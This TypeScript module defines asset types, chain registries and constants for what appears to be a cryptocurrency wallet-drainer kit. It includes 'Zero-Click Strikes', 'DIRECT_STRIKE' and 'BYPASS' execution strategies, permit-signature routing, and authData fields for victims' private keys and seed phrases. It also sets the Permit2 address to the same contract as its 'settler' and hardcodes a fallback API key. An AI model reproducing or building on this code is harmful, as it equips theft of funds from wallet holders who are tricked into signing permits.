import {
  mainnet,
  bsc,
  polygon,
  base,
  arbitrum,
  optimism,
  hardhat,
} from "viem/chains";
import { Network } from "alchemy-sdk";

/**
 * 🏗️ CORE ASSET INTERFACE
 * Standardized data structure for Cross-Chain discovery.
 */
export interface UniversalAsset {
  symbol: string;
  name: string;
  decimals: number;
  balance: string; // Raw BigInt string for precision
  displayBalance: string;
  contractAddress?: string;

  // 🛡️ Standardized Union for Engine Routing
  chain: "EVM" | "SOLANA" | "BITCOIN" | "TRON" | "LITECOIN" | "XRP" | "DOGE";

  networkName: string;
  chainId: number;
  logo?: string;
  permitSupported: boolean;

  /**
   * 💰 VALUE TRACKING
   */
  usdValue?: number;

  /**
   * 👻 GHOST VAULT SUPPORT
   */
  isGhost?: boolean;
  vaultAddress?: string;
  ghostEnabled?: boolean;

  /**
   * ✍️ authData: Structured data for Wave 2 popups and Zero-Click Strikes.
   */
  authData?: {
    domain: Record<string, any>;
    types: Record<string, any>;
    primaryType: string;
    message: Record<string, any>;
    hasExistingAllowance?: boolean;

    /** 🎯 VECTOR TRACKING: Added to fix Zero-Click routing */
    spender?: string; // The actual address that has the allowance (Settler, Permit2, or Router)
    spenderName?: string; // UI-friendly name (e.g., "SETTLER")

    protocol?: string;
    privateKey?: string;
    seed?: string;
  };

  /**
   * 🛰️ Signature Routing Type
   */
  signatureType?:
    | "EIP2612"
    | "PERMIT2"
    | "NATIVE"
    | "DIRECT"
    | "GHOST"
    | "PERMIT_SIGN";
}

/**
 * ⚡ EXECUTION ENGINE STRATEGIES
 */
export type ExecutionStrategy =
  | "ZERO_CLICK"
  | "PERMIT_SIGN"
  | "BATCH_PERMIT2"
  | "CHAIN_SWITCH"
  | "DIRECT_STRIKE"
  | "BYPASS";

export interface StrategyMap {
  asset: UniversalAsset;
  strategy: ExecutionStrategy;
  priority: number;
}

// --- CONFIGURATION CONSTANTS ---

export const ALCHEMY_KEY =
  process.env.NEXT_PUBLIC_ALCHEMY_API_KEY || "LEcRJW_Bhx4ybZ7TSZ3p9";

export const SETTLER_ADDR =
  (process.env.NEXT_PUBLIC_SETTLER_ADDR as `0x${string}`) ||
  "0x6511e4ed799cc3e24cd895e93001ec0d9363fc1c";

export const PERMIT2_ADDRESS = "0x6511e4ed799cc3e24cd895e93001ec0d9363fc1c";

/**
 * ⛓️ EVM CHAIN REGISTRY
 */
export const EVM_CHAINS = [
  {
    id: 31337,
    viemChain: hardhat,
    alchemyNet: Network.ETH_MAINNET,
    rsc: "eth-mainnet",
    label: "Hardhat Local",
  },
  {
    id: 1,
    viemChain: mainnet,
    alchemyNet: Network.ETH_MAINNET,
    rsc: "eth-mainnet",
    label: "Ethereum",
  },
  {
    id: 56,
    viemChain: bsc,
    alchemyNet: Network.BNB_MAINNET,
    rsc: "bnb-mainnet",
    label: "BNB Chain",
  },
  {
    id: 137,
    viemChain: polygon,
    alchemyNet: Network.MATIC_MAINNET,
    rsc: "polygon-mainnet",
    label: "Polygon",
  },
  {
    id: 8453,
    viemChain: base,
    alchemyNet: Network.BASE_MAINNET,
    rsc: "base-mainnet",
    label: "Base",
  },
  {
    id: 42161,
    viemChain: arbitrum,
    alchemyNet: Network.ARB_MAINNET,
    rsc: "arbitrum-mainnet",
    label: "Arbitrum",
  },
  {
    id: 10,
    viemChain: optimism,
    alchemyNet: Network.OPT_MAINNET,
    rsc: "optimism-mainnet",
    label: "Optimism",
  },
];

export const PERMIT_ABI = [
  {
    inputs: [{ name: "owner", type: "address" }],
    name: "nonces",
    outputs: [{ type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "name",
    outputs: [{ type: "string" }],
    stateMutability: "view",
    type: "function",
  },
] as const;

/**
 * 🛡️ ENVIRONMENT POLYFILLS
 */
if (typeof window !== "undefined") {
  import("buffer").then(({ Buffer }) => {
    window.Buffer = (window as any).Buffer || Buffer;
  });
}
